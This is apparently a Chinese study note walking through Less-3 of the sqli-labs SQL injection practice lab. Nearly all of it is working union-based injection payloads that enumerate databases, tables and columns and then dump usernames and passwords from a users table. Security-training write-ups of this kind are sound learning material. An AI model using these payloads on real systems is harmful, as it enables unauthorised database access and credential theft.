---
title: less3
url: https://www.yuque.com/u29002979/ep2zrx/vs7oyn5211mrgbwx
---

```bash
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

参数加了括号和单引号。

`?id=1'`报错，有注入点。

> \+号在浏览器中空格
> \#号的ascll码是%23

`?id=1') order by 4 --+`报错，没有第4列
`?id=1') order by 3 --+`显示正常，有3列

`?id=-1') union select 1,2,3 --+`显示2，3是回显点。

`?id=-1') union select 1,2,group_concat(schema_name) from information_schema.schemata --+`

`?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+`

`?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns  where table_name ='users'--+`

`?id=-1') union select 1,2,(select group_concat(username,0x7e,password) from users)--+`
